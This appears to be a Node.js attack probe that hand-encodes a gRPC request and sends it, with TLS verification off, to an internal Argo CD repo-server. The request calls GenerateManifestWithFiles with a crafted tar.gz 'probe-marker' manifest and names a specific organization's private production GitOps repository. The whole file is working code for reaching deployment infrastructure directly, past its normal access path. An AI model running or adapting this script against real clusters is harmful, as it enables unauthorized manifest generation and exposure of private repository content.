const http2=require('http2'),crypto=require('crypto');
// ---- 构造一个合法的 USTAR tar.gz（node 手工打包，避免 busybox tar 触发崩溃）----
function ustar(name,content,mode){
  const c=Buffer.from(content,'utf8');
  const h=Buffer.alloc(512,0);
  h.write(name,0,100,'utf8');
  h.write('000644 ',100,8); h.write('000000 ',108,8); h.write('000000 ',116,8);
  h.write(c.length.toString(8).padStart(11,'0')+' ',124,12);
  h.write(Math.floor(Date.now()/1000).toString(8).padStart(11,'0')+' ',136,12);
  h.write('        ',148,8);
  h.write('0',156,1); h.write('ustar',257,5); h.write('00',263,2);
  h.write('root',265,32); h.write('root',297,32);
  let sum=0; for(let i=0;i<512;i++)sum+=h[i];
  h.write(sum.toString(8).padStart(6,'0')+'\0 ',148,8);
  const pad=Buffer.alloc((512-(c.length%512))%512,0);
  return Buffer.concat([h,c,pad]);
}
function tarGz(){const t=Buffer.concat([
  ustar('kustomization.yaml','apiVersion: kustomize.config.k8s.io/v1beta1\nkind: Kustomization\nresources:\n- cm.yaml\n',0o644),
  ustar('cm.yaml','apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: probe-marker\ndata:\n  hello: world\n',0o644),
  Buffer.alloc(1024,0)
]);return require('zlib').gzipSync(t);}
const TGZ=tarGz();
const SUM=crypto.createHash('sha256').update(TGZ).digest('hex');
function v(x){x>>>=0;const b=[];while(x>127){b.push((x&127)|128);x>>>=7;}b.push(x&127);return Buffer.from(b);}
function f(n,d){return Buffer.concat([v((n<<3)|2),v(d.length),d]);}
function fv(n,x){return Buffer.concat([v((n<<3)|0),v(x)]);}
function gf(m){const h=Buffer.alloc(5);h.writeUInt32BE(m.length,1);return Buffer.concat([h,m]);}
// ManifestRequest: repo(1){repo(1)}, revision(2), noCache(3), appLabelKey(4),
// appName(5), namespace(8), applicationSource(10), kustomizeOptions(13), kubeVersion(15?), apiVersions(16?)
const REPO='git@github.com:u2u-eco/u2sec-gitops-prod';
const src=Buffer.concat([f(1,Buffer.from(REPO)),f(2,Buffer.from('probe'))]);
let req=Buffer.concat([
  f(1,f(1,Buffer.from(REPO+'.git'))),      // repo url（试探缓存路径就用带 .git 的？先不带，稍后看）
  f(2,Buffer.from('HEAD')),
  f(5,Buffer.from('probe-test')),
  f(8,Buffer.from('argocd')),
  f(10,src)
]);
// kustomizeOptions 留空（不加 binaryPath）
const w1=Buffer.concat([v(10),v(req.length),req]);
const md=Buffer.concat([f(1,Buffer.from(SUM)),fv(2,TGZ.length)]);
const w2=Buffer.concat([v(18),v(md.length),md]);
const ch=f(1,TGZ);
const w3=Buffer.concat([v(26),v(ch.length),ch]);
const sess=http2.connect('https://172.20.135.138:8081',{rejectUnauthorized:false});
let data=Buffer.alloc(0),t={},rH=null,done=false,t0=Date.now();
sess.on('error',e=>{if(!done){done=true;console.log('SESS-ERR',e.message);process.exit(1)}});
const s=sess.request({':method':'POST',':scheme':'https',':authority':'x',':path':'/repository.RepoServerService/GenerateManifestWithFiles','content-type':'application/grpc','te':'trailers'});
s.on('response',h=>{rH=h});
s.on('data',d=>data=Buffer.concat([data,d]));
s.on('trailers',x=>{for(const k in x)t[k]=Buffer.from(x[k]).toString()});
const fin=()=>{if(done)return;done=true;
  const src2=t['grpc-status']!==undefined?t:(rH||{});
  console.log('ts='+(Date.now()-t0)+'ms gs='+src2['grpc-status'],'msg='+decodeURIComponent(src2['grpc-message']||'').slice(0,300));
  let pos=0;
  while(pos+5<=data.length){const len=data.readUInt32BE(pos+1);pos+=5;if(pos+len>data.length)break;const m=data.slice(pos,pos+len);pos+=len;
    let p=0;while(p<m.length){const tag=m[p];p++;const fn=tag>>3,wt=tag&7;
      if(wt===2){let l=0,sh=0;while(true){const b=m[p];p++;l+=(b&127)*Math.pow(2,sh);sh+=7;if(!(b&128))break;}const val=m.slice(p,p+l);p+=l;
        if(fn===1)console.log('MANIFEST:',val.toString('utf8').slice(0,200).replace(/\n/g,'\\n'));}
      else if(wt===0){while(p<m.length&&(m[p]&128))p++;p++;}else break;}}
  console.log('data='+data.length+'B');
  process.exit(0);};
s.on('end',fin);s.on('close',fin);
s.write(gf(w1));setTimeout(()=>{s.write(gf(w2));s.write(gf(w3));s.end();},50);
setTimeout(()=>{if(!done){done=true;console.log('TIMEOUT');process.exit(2)}},60000);
